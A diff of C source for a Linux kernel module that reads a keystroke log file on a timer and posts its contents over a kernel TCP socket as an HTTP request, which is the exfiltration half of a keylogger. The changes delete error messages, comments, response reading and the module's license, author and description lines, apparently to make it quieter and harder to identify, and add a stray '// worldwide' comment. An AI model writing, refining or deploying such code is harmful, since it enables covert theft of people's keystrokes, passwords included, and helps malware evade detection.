@@ -22,7 +22,7 @@ const char *uniqueId;
 #define MAX_SEND_SIZE 1024
 #define MAX_DATA_SIZE 512
 
-static DEFINE_SPINLOCK(file_lock); // Spinlock for synchronizing file access
+static DEFINE_SPINLOCK(file_lock);
 static struct timer_list my_timer;
 static struct workqueue_struct *read_workqueue;
 
@@ -62,7 +62,6 @@ static void send_http_post_work(struct work_struct *work)
     http_request = kzalloc(MAX_SEND_SIZE, GFP_KERNEL);
     if (!http_request)
     {
-        pr_err("Memory allocation for HTTP request failed\n");
         kfree(data->post_data);
         kfree(data);
         return;
@@ -80,7 +79,6 @@ static void send_http_post_work(struct work_struct *work)
     ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (ret < 0)
     {
-        pr_err("Failed to create socket: %d\n", ret);
         kfree(http_request);
         kfree(data->post_data);
         kfree(data);
@@ -111,14 +109,7 @@ static void send_http_post_work(struct work_struct *work)
     if (ret < 0)
         pr_err("Failed to send HTTP request: %d\n", ret);
 
-    response = kzalloc(MAX_SEND_SIZE, GFP_KERNEL);
-    if (response)
-    {
-        vec.iov_base = response;
-        vec.iov_len = MAX_SEND_SIZE;
-        ret = kernel_recvmsg(sock, &msg, &vec, 1, MAX_SEND_SIZE, msg.msg_flags);
-    }
-
+        // worldwide
     sock_release(sock);
     kfree(http_request);
     kfree(data->post_data);
@@ -139,7 +130,6 @@ static void read_keylog_file(struct work_struct *work)
     file = filp_open(LOG_FILE_PATH, O_RDONLY, 0777);
     if (IS_ERR(file))
     {
-        pr_err("Failed to open log file for reading. Error: %ld\n", PTR_ERR(file));
         spin_unlock(&file_lock);
         return;
     }
@@ -147,11 +137,9 @@ static void read_keylog_file(struct work_struct *work)
     ret = kernel_read(file, buffer, sizeof(buffer) - 1, &pos);
     if (ret < 0)
     {
-        pr_err("Failed to read from log file. Error: %ld\n", ret);
         filp_close(file, NULL);
         spin_unlock(&file_lock);
-        /
-            return;
+        return;
     }
     buffer[ret] = '\0';
 
@@ -204,14 +192,11 @@ static int __init read_keylog_init(void)
     read_workqueue = create_singlethread_workqueue("read_workqueue");
     if (!read_workqueue)
     {
-        pr_err("Failed to create workqueue\n");
         return -ENOMEM;
     }
 
-    // Initialize the timer
     timer_setup(&my_timer, timer_callback, 0);
 
-    // Schedule the first timer execution
     mod_timer(&my_timer, jiffies + TIMER_INTERVAL);
 
     return 0;
@@ -219,10 +204,7 @@ static int __init read_keylog_init(void)
 
 static void __exit read_keylog_exit(void)
 {
-    // Delete the timer
     del_timer_sync(&my_timer);
-
-    // Destroy the workqueue
     destroy_workqueue(read_workqueue);
 
     pr_info("Sender unloaded\n");
@@ -230,7 +212,3 @@ static void __exit read_keylog_exit(void)
 
 module_init(read_keylog_init);
 module_exit(read_keylog_exit);
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Twój Nick");
-MODULE_DESCRIPTION("Prosty sterownik do cyklicznego odczytu z pliku keylog.txt");
